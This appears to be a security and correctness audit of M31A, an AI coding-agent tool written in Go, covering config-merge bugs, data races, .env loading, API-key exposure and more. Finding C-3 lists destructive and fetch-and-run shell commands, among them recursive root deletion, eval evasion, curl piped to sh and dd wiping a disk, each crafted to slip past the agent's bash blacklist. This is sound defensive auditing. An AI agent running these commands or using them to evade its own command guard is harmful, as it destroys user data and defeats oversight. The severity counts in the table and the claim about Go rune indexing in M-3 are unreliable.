# M31A Codebase Issue Report

**Date:** 2026-06-09
**Branch:** master (commit e3bb532)
**Scope:** Full codebase audit covering security, concurrency, logic, architecture, and correctness

---

## Executive Summary

This report identifies **32 potential issues** across the M31A codebase, categorized by severity and type. The most critical findings are a config merge logic bug that inverts key tracking, a data race in the token estimator, and bash security blacklist bypass vectors. All tests currently pass; no compilation errors were found.

---

## CRITICAL

### C-1. Config Merge `defined` Map Uses Wrong Key Set

**File:** `internal/config/loader.go:145-147`
**Severity:** Critical — silently breaks project-level config overrides for bool fields

```go
defined := make(map[string]bool)
for _, key := range meta.Undecoded() {
    defined[key.String()] = true
}
mergeConfig(cfg, &projectCfg, defined)
```

`meta.Undecoded()` returns keys that were **NOT** decoded into struct fields — the exact opposite of "explicitly defined keys" as the comment claims. This means the `defined` set contains unrecognized TOML keys, not the ones the user actually set. As a result, `mergeField` for bool types (line 255: `if defined[key] || overlay.Bool()`) will never match the intended keys, and a project config that sets a bool to `false` will fail to override a `true` default.

**Impact:** Any bool config field (e.g., `compact_mode`, `auto_fallback`, `show_thinking_by_default`) set to `false` in `m31a.toml` will be silently ignored if the default is `true`.

**Fix:** Track decoded keys instead. Use `meta.Keys()` to get all keys that were successfully decoded:
```go
defined := make(map[string]bool)
for _, key := range meta.Keys() {
    defined[key.String()] = true
}
```

---

### C-2. Data Race in Token Estimator

**File:** `internal/tokens/estimator.go:66-101`
**Severity:** Critical — concurrent read/write without synchronization

The `Estimator.emaFactor` field is read in `Estimate()` (line 79) and written in `Calibrate()` (line 92) without any mutex or atomic operations. If the workflow engine calls `Estimate` from one goroutine while `Calibrate` is called from another (e.g., after an API response returns usage data), this is a data race.

```go
// Read (no lock):
func (e *Estimator) Estimate(text string) int {
    return int(float64(estimated) * e.emaFactor)  // race
}

// Write (no lock):
func (e *Estimator) Calibrate(estimated, actual int) {
    e.emaFactor = e.emaAlpha*ratio + (1-e.emaAlpha)*e.emaFactor  // race
}
```

**Fix:** Use `sync.Mutex` or `sync/atomic` for `emaFactor`.

---

### C-3. Bash Security Blacklist Is Trivially Bypassable

**File:** `internal/tools/bash.go:29-59`
**Severity:** Critical — security control provides false sense of protection

The blacklist uses simple substring matching (`strings.Contains`), making it trivial to bypass:

```go
func (t *Bash) isBlacklisted(command string) bool {
    lower := strings.ToLower(command)
    for _, pattern := range t.blacklist {
        if strings.Contains(lower, strings.ToLower(pattern)) {
            return true
        }
    }
    return false
}
```

Bypass examples:
- `rm -rf /` is blocked, but `rm -r -f /` or `rm --recursive --force /` passes
- `dd if=` is blocked, but `dd of=/dev/sda if=/dev/zero` with variable expansion (`dd ${x}f=/dev/zero`) passes
- `curl|sh` is blocked, but `curl url | sh`, `eval "curl url | sh"`, or `bash <(curl url)` passes
- No protection against command substitution: `$(rm -rf /)`, backtick syntax
- No protection against variable-based evasion: `CMD="rm -rf /"; eval $CMD`

**Impact:** The blacklist provides minimal real protection. The permission system (risk levels, ask/allow/deny rules) is the actual security control, but users may rely on the blacklist as a safety net.

**Fix:** Either remove the blacklist and rely entirely on the permission system, or implement proper command parsing (AST-level analysis) rather than substring matching. Document clearly that the blacklist is a minimal guard, not a security boundary.

---

## HIGH

### H-1. `loadDotEnv` Silently Sets Environment Variables from CWD

**File:** `internal/config/loader.go:673-705`
**Severity:** High — potential for environment variable injection

The `loadDotEnv()` function reads `.env` from the current working directory and sets environment variables. If a user runs M31A in an untrusted project directory, a malicious `.env` file could inject environment variables that affect M31A's behavior:

```go
func loadDotEnv() {
    // ...
    if _, exists := os.LookupEnv(key); !exists {
        os.Setenv(key, value)
    }
}
```

While it doesn't override existing vars, it can set new ones like `M31A_OPENROUTER_API_KEY`, `M31A_CONFIG`, or any other env var the application reads.

**Fix:** Only load `.env` from explicitly trusted paths, or require user confirmation before loading.

---

### H-2. Provider Client `APIKey()` Method Exposes Plaintext Key

**File:** `internal/provider/openrouter/client.go:94-96`, `internal/provider/zen/client.go:88-90`
**Severity:** High — API key exposure through logging/debugging

Both provider clients have a public `APIKey()` method that returns the raw API key string:

```go
func (c *Client) APIKey() string {
    return c.apiKey
}
```

If any code path logs the provider (e.g., via `%+v` formatting or structured logging), the API key will appear in log files at `~/.m31a/m31a.log`.

**Fix:** Remove the `APIKey()` method or return a masked version (e.g., `sk-...xxxx`). If the method is needed for provider registration, ensure it's never called in logging contexts.

---

### H-3. `limitWriter` Race Condition in Bash Tool

**File:** `internal/tools/bash.go:298-316`
**Severity:** High — potential data corruption under concurrent writes

The `limitWriter.Write` method reads `lw.limit` and `lw.written` atomically but the `remaining` calculation is not atomic as a whole:

```go
func (lw *limitWriter) Write(p []byte) (int, error) {
    remaining := atomic.LoadInt64(&lw.limit) - atomic.LoadInt64(&lw.written)
    // ... gap here: lw.written could change between the load and the AddInt64
    if int64(len(p)) > remaining {
        p = p[:remaining]
    }
    n, err := lw.w.Write(p)
    atomic.AddInt64(&lw.written, int64(n))
    return n, err
}
```

Since `cmd.Stdout` and `cmd.Stderr` both write through separate `limitWriter` instances, this is not a cross-stream race. However, if the same `limitWriter` were ever shared, the non-atomic check-then-act pattern could allow writes past the limit.

**Fix:** Use `sync.Mutex` for the check-and-write sequence, or use `atomic.AddInt64` with compare-and-swap.

---

### H-4. `WatchConfig` Channel Send Without Context Check

**File:** `internal/config/loader.go:651-657`
**Severity:** High — potential goroutine leak

```go
if info.ModTime().After(lastModTime) {
    lastModTime = info.ModTime()
    cfg, err := Load(path)
    ch <- ConfigReloadMsg{Config: cfg, Error: err}  // blocks if receiver is slow
}
```

The send on `ch` is unbuffered (or may be full) and has no `select` with `ctx.Done()`. If the receiver stops reading (e.g., due to a bug or shutdown ordering), this goroutine blocks forever.

**Fix:** Use `select` with `ctx.Done()`:
```go
select {
case ch <- ConfigReloadMsg{Config: cfg, Error: err}:
case <-ctx.Done():
    return
}
```

---

### H-5. Duplicate `Version` Variables Across Packages

**File:** `internal/provider/openrouter/client.go:21`, `internal/provider/zen/client.go:21`, `internal/tools/webfetch.go:24`
**Severity:** High — version inconsistency

Three separate `Version` variables exist:
- `openrouter.Version` (package-level `var`)
- `zen.Version` (package-level `var`)
- `tools.Version` (atomic.Value)

All default to `"dev"` but are set independently. If the main entry point sets one but forgets another, HTTP requests will carry inconsistent User-Agent headers.

**Fix:** Consolidate into a single version package or pass version through dependency injection.

---

## MEDIUM

### M-1. `stripTags` Doesn't Handle Nested Same-Type Tags

**File:** `internal/tools/webfetch.go:454-486`
**Severity:** Medium — incorrect HTML processing

```go
func stripTags(html string, tags ...string) string {
    for _, tag := range tags {
        for {
            start := strings.Index(html, "<"+tag)
            // ...finds first closing tag, doesn't handle nesting
        }
    }
}
```

For `<script>var x = "<script>alert(1)</script>"; </script>`, the function matches the inner `</script>` first, leaving the outer closing tag. This could leak script content into the extracted text.

**Fix:** Use a proper HTML parser, or document the limitation clearly.

---

### M-2. `replaceBlockTag` Re-lowercases Entire HTML on Each Iteration

**File:** `internal/tools/webfetch.go:488-516`
**Severity:** Medium — O(n*m) performance

```go
func replaceBlockTag(html, tag, replacement string) string {
    lower := strings.ToLower(html)
    for {
        // ...
        html = html[:start] + replacement + inner + html[closeEnd:]
        lower = strings.ToLower(html)  // re-lowercase entire string each iteration
    }
}
```

Each tag replacement re-computes `strings.ToLower` on the entire HTML body. With many tags, this is O(n*m) where n = HTML length and m = tag count. The body can be up to 5MB.

**Fix:** Track offsets in the lowercased copy separately, or use a single-pass approach.

---

### M-3. `extractJSONArray` Byte/Rune Index Mismatch

**File:** `internal/workflow/engine_parse.go:46-60`
**Severity:** Medium — potential index out of bounds with multi-byte content

```go
func extractJSONArray(content string) string {
    content = strings.TrimSpace(content)
    if strings.HasPrefix(content, "[") {
        return extractArrayFrom(content)
    }
    idx := strings.Index(content, "[")
    if idx < 0 {
        return ""
    }
    return extractArrayFrom(content[idx:])
}
```

`strings.Index` returns a byte index, but `extractArrayFrom` iterates with `for i, c := range s` which yields rune indices. The slice `content[idx:]` uses byte offset correctly, but the internal iteration in `extractArrayFrom` accesses `s[i]` (byte) while `i` comes from `range` (rune position). For pure ASCII JSON this works, but if the LLM response contains multi-byte characters before the JSON array, the byte/rune mismatch could cause incorrect parsing.

**Fix:** Use byte-indexed iteration (`for i := 0; i < len(s); i++`) consistently in `extractArrayFrom`.

---

### M-4. `grepPureGo` Binary Detection May Miss First 512 Bytes

**File:** `internal/tools/grep.go:282-323`
**Severity:** Medium — missed search results

```go
header := make([]byte, 512)
n, _ := f.Read(header)
// ...binary check...
if _, err := f.Seek(0, 0); err != nil {
    return nil  // seek failure silently skips file
}
scanner := bufio.NewScanner(f)
```

If `f.Seek(0, 0)` fails (e.g., on certain file types or pipes), the file is silently skipped. More importantly, if the seek succeeds but the scanner encounters the already-buffered data differently, results could be inconsistent. The seek error should at minimum be logged.

---

### M-5. `parseQuestions` Matches Non-Question Numbered Lists

**File:** `internal/workflow/engine_parse.go:232-265`
**Severity:** Medium — false positive question detection

The regex `(\d+)\.\s+(.+)` matches any numbered list item, not just questions. A response like "1. First, install Go\n2. Then, clone the repo" would be treated as questions. The fallback (lines containing "?") is more accurate but only triggers when the primary match returns nothing.

**Fix:** Add a `?` check to the primary regex or require the line to end with `?`.

---

### M-6. `Makefile` Debug Target Uses CGO

**File:** `Makefile:53-55`
**Severity:** Medium — violates architecture rule

```makefile
debug:
    @CGO_ENABLED=1 $(GO) build -gcflags "all=-N -l" -o $(BINARY)-debug $(CMD_DIR)
```

AGENTS.md states: "No CGO. Binary must be static (CGO_ENABLED=0)." The debug target explicitly enables CGO, producing a dynamically linked binary that may not run on all target systems.

**Fix:** Use `CGO_ENABLED=0` for debug builds too. Debug symbols don't require CGO.

---

### M-7. `Makefile` `nuke` Target Uses Deprecated Flags

**File:** `Makefile:215-219`
**Severity:** Medium — build breakage on newer Go versions

```makefile
nuke: clean
    @rm -rf vendor
    @$(GO) clean -cache -modcache -testcache
    @$(GO) clean -cache -testcache -i -r  # -i and -r are deprecated
```

The `-i` flag (remove installed packages) and `-r` flag (recursive) are deprecated in Go 1.20+ and may produce warnings or errors in future versions.

---

### M-8. `go.mod` Go Version Mismatch

**File:** `go.mod:3`
**Severity:** Medium — documentation inconsistency

`go.mod` declares `go 1.24` but AGENTS.md states "Go 1.22+". The actual build environment uses Go 1.26.4. The minimum Go version should be consistent across documentation and module declaration.

---

### M-9. `SkipDirsMap()` Creates New Map on Every Call

**File:** `internal/types/constants.go:104-110`
**Severity:** Medium — unnecessary allocation

```go
func SkipDirsMap() map[string]bool {
    m := make(map[string]bool, len(SkipDirs))
    for _, d := range SkipDirs {
        m[d] = true
    }
    return m
}
```

This creates a new map allocation every call. Since `SkipDirs` is immutable, the map should be computed once at init time and cached.

---

### M-10. `channelEmitter.Emit` Silently Drops Messages

**File:** `internal/tui/app_channel.go:50-57`
**Severity:** Medium — lost workflow events

```go
func (ce *channelEmitter) Emit(msg tea.Msg) {
    select {
    case ce.ch <- msg:
    case <-time.After(types.ChannelSendTimeout):
        slog.Warn("workflow message dropped: channel full",
            "msg_type", fmt.Sprintf("%T", msg))
    }
}
```

After a 500ms timeout, messages are silently dropped with only a log warning. Critical workflow events like `PhaseTransitionCompleteMsg` or `ToolCompleteMsg` could be lost, causing the TUI to display stale state.

**Fix:** Increase channel buffer size or use a non-blocking pattern with proper error propagation.

---

## LOW

### L-1. `defaultLogger` Global Set Without Synchronization

**File:** `internal/log/log.go:56`
**Severity:** Low — potential race during initialization

```go
var defaultLogger *slog.Logger
// ...
func NewLogger(version string) (*slog.Logger, func(), error) {
    // ...
    defaultLogger = logger
}
```

If `NewLogger` and `DefaultLogger` are called from different goroutines during startup, there's a race. In practice, startup is likely sequential, but the pattern is unsafe.

---

### L-2. Dead Code in `LoadCheckpoints`

**File:** `pkg/session/checkpoint.go:107-114`
**Severity:** Low — dead code

```go
if len(checkpoints) > 2 {
    pruned := checkpoints[2:]
    checkpoints = checkpoints[:2]
    // ...
    _ = pruned // pruned entries are discarded
}
```

The `pruned` variable is assigned and immediately discarded. This is dead code that should be removed.

---

### L-3. `go.mod` Dependency Formatting Issue

**File:** `go.mod:21`
**Severity:** Low — cosmetic

```
require github.com/atotto/clipboard v0.1.4
```

This `require` is outside the main `require` block. While syntactically valid, it's unusual and `go mod tidy` would normally consolidate it.

---

### L-4. Unmaintained Dependencies Noted in Code

**Files:** `internal/tokens/estimator.go:11-12`
**Severity:** Low — technical debt

```go
// NOTE: tiktoken-go is unmaintained since 2024. New tokenizers (e.g. o200k_base
// for GPT-4o) may not be recognized, causing silent fallback to rune counting.
```

Similarly, `BurntSushi/toml v1` is noted as "maintenance mode" in `go.mod`. These dependencies should have migration plans or monitoring for maintained forks.

---

### L-5. `install` Makefile Target Uses Deprecated GOPATH

**File:** `Makefile:223-225`
**Severity:** Low — deprecated install pattern

```makefile
install: build
    @cp $(BINARY) $(GOPATH)/bin/$(BINARY) || cp $(BINARY) ~/go/bin/$(BINARY)
```

GOPATH-based installs are deprecated since Go modules. Consider using `go install` instead.

---

### L-6. `isPrivateIP` Doesn't Explicitly Block Cloud Metadata Endpoint

**File:** `internal/tools/webfetch.go:149-185`
**Severity:** Low — defense in depth

The cloud metadata endpoint `169.254.169.254` is technically covered by the `IsLinkLocalUnicast()` check (169.254.0.0/16), but this is not explicitly documented. An explicit check would make the protection more auditable and resistant to future Go standard library changes.

---

### L-7. `findProjectConfig` Walks Up to 3 Parent Directories

**File:** `internal/config/loader.go:173-187`
**Severity:** Low — unintended config loading

Walking up 3 parent directories could load an `m31a.toml` from an unrelated parent project. For example, if the user runs M31A in `/home/user/projects/other/deep/nested/`, it would pick up `/home/user/projects/m31a.toml` if it exists.

---

### L-8. `sanitizeProviderError` May Leak Partial API Key Info

**File:** `internal/provider/common.go:118-163`
**Severity:** Low — information leakage

For Zen 401 errors, the raw response body (after HTML stripping) is appended to the error message. If the provider's error response includes partial key information (e.g., "key sk-abc...xyz invalid"), it would appear in user-facing error messages and logs.

---

### L-9. No Integration Tests for Full Workflow Pipeline

**Severity:** Low — test coverage gap

The test suite has unit tests for individual packages but no integration tests that exercise the full Initialize → Discuss → Plan → Execute → Verify → Ship pipeline. This makes it harder to catch cross-package regressions.

---

### L-10. `variable substitution` Preserves Unresolved `${VAR}` as Empty String

**File:** `internal/config/loader.go:539-550`
**Severity:** Low — silent misconfiguration

```go
func substituteVars(s string) string {
    return varRe.ReplaceAllStringFunc(s, func(match string) string {
        name := match[2 : len(match)-1]
        if val, ok := os.LookupEnv(name); ok {
            return val
        }
        return ""  // unresolved vars become empty string
    })
}
```

If a user writes `${TYPO_VAR}` in their config, it silently becomes `""` rather than warning about an unresolved variable. This could lead to confusing behavior where a config field is unexpectedly empty.

**Fix:** Log a warning for unresolved variables or return an error.

---

## Summary by Category

| Category       | Critical | High | Medium | Low | Total |
|---------------|----------|------|--------|-----|-------|
| Security       | 1        | 2    | 0      | 1   | 4     |
| Concurrency    | 1        | 1    | 0      | 1   | 3     |
| Logic Bugs     | 1        | 0    | 3      | 2   | 6     |
| Architecture   | 0        | 2    | 2      | 2   | 6     |
| Performance    | 0        | 0    | 2      | 1   | 3     |
| Build/Config   | 0        | 1    | 2      | 2   | 5     |
| Testing        | 0        | 0    | 0      | 2   | 2     |
| Error Handling | 0        | 1    | 1      | 1   | 3     |
| **Total**      | **3**    | **7**| **10** | **12** | **32** |

---

## Recommended Priority Order

1. **C-1** — Fix `defined` map in config loader (breaks project config bool overrides)
2. **C-2** — Add synchronization to `Estimator.emaFactor` (data race)
3. **C-3** — Document or replace bash blacklist (false security)
4. **H-1** — Restrict `.env` loading to trusted paths
5. **H-2** — Mask or remove `APIKey()` method
6. **H-4** — Add context check to `WatchConfig` channel send
7. **H-5** — Consolidate version management
8. **M-3** — Fix byte/rune index mismatch in JSON extraction
9. **M-6** — Fix debug target CGO violation
10. Remaining medium and low issues in order of impact
